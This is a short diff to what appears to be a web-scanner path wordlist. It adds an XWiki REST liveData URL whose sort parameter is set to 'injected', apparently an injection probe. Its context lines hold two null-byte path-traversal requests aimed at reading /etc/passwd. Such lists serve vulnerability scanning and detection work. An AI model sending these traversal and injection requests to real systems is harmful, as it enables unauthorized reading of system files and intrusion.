@@ -251,3 +251,4 @@
 /login/design/img/ico/favicon.ico
 /user/index.php?api=1&scripts=.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./etc/passwd
 /user/login.php?api=1&scripts=.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./etc/passwd
+/xwiki/rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=injected
